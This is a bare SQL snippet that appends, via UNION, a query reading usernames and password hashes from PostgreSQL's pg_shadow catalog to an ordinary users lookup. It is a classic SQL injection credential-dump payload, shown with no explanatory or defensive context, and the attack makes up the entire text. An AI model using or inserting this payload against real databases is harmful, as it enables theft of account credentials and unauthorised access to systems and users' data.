SELECT id, name FROM users WHERE id = 1
UNION
SELECT usename, passwd FROM pg_shadow;
